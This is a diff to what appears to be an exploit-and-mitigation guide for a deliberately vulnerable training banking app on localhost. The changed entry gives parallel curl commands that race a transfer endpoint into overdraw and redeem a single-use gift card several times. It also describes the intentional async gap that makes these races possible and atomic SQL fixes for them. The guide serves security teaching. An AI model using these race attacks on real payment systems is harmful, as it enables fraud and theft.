@@ -41,7 +41,7 @@ Hidden secret in JS bundle: sk_live_NOVATRUST_DEBUG_4242424242424242
  [10]  Mass assignment — register w/ role=admin (A08, Ch 32)
  [11]  Mass assignment — API PUT /users/:id (Ch 32 API3)
  [12]  Prototype pollution — lodash.merge   (Ch 31)
- [13]  Race condition — duplicate transfer  (Ch 29)
+ [13]  Race condition — balance overdraw (/transfer/send) + gift-card limit overrun (/rewards/redeem)  (Ch 21)
  [14]  No CSRF protection — GET transfer     (Ch 23)
  [15]  Clickjacking — no X-Frame-Options     (Ch 23)
  [16]  Open redirect — /go?u= and /login?next= (Ch 16)
@@ -480,22 +480,39 @@ MITIGATION
   lodash to 4.17.21+ and pair with a Map-based settings store.
 
 --------------------------------------------------------------------------------
- [13] Race condition — duplicate transfer
+ [13] Race condition — balance overdraw + gift-card limit overrun (Ch 21)
 --------------------------------------------------------------------------------
-Endpoint:   POST /transfer/send (or GET /transfer/send)
+Endpoints:  POST /transfer/send (or GET /transfer/send)   -> routes/transfers.js
+            POST /rewards/redeem                           -> routes/rewards.js
 
-EXPLOIT
-  # Issue 20 transfers in parallel for a single account
-  for i in {1..20}; do
-    curl -s -b cookies "http://localhost:3001/transfer/send?from=4002-1188-0001&to=4002-9999-0001&amount=1000000&memo=race" &
-  done; wait
-  # Multiple transfers succeed past the balance check, ending with a
-  # negative balance because the per-row update is not transactional with
-  # the balance read.
+Both sinks are read-check-write with a REAL async gap between the check and the
+write (`await sleep(200)`), so overlapping requests all pass the check before
+any of them writes. (The gap must be an async yield: a synchronous busy-spin
+would block Node's single thread and NOT race.)
+
+EXPLOIT (overdraw)
+  # ~$12,487.50 in 4002-1188-0001; fire 10 transfers of $10,000 in parallel:
+  seq 10 | xargs -P10 -I{} curl -s -b cookies -o /dev/null \
+    "http://localhost:3001/transfer/send?from=4002-1188-0001&to=4002-1188-0002&amount=1000000&memo=r{}"
+  # 3+ succeed past the balance check -> the source balance goes negative.
+
+EXPLOIT (gift-card limit overrun)
+  # NOVA-WELCOME-50 is a single-use $50 code; redeem it many times at once:
+  seq 25 | xargs -P25 -I{} curl -s -b cookies -o /dev/null \
+    -d "code=NOVA-WELCOME-50" http://localhost:3001/rewards/redeem
+  # 4+ redemptions land -> checking credited 4 x $50 = $200 from one $50 card,
+  # while the card ends flagged redeemed=1. Codes: NOVA-WELCOME-50 ($50),
+  # NOVA-BONUS-25 ($25), NOVA-USED-10 (already spent).
 
 MITIGATION
-  Wrap the read-check-update in a single SQL transaction with row locking
-  (e.g. `UPDATE accounts SET balance = balance - ? WHERE id = ? AND balance >= ?`).
+  Collapse read-check-write into ONE atomic, conditional statement the DB
+  serialises, then act only when it changed a row:
+    transfer:  UPDATE accounts SET balance_cents = balance_cents - ?
+               WHERE id = ? AND balance_cents >= ?           (check changes===1)
+    gift card: UPDATE gift_cards SET redeemed = 1, redeemed_by = ?
+               WHERE code = ? AND redeemed = 0               (credit iff changes===1)
+  Or wrap the sequence in a transaction with row locking (SELECT ... FOR UPDATE),
+  an optimistic version column, or an app-level lock (Redis) across instances.
 
 --------------------------------------------------------------------------------
  [14] No CSRF protection — GET transfer
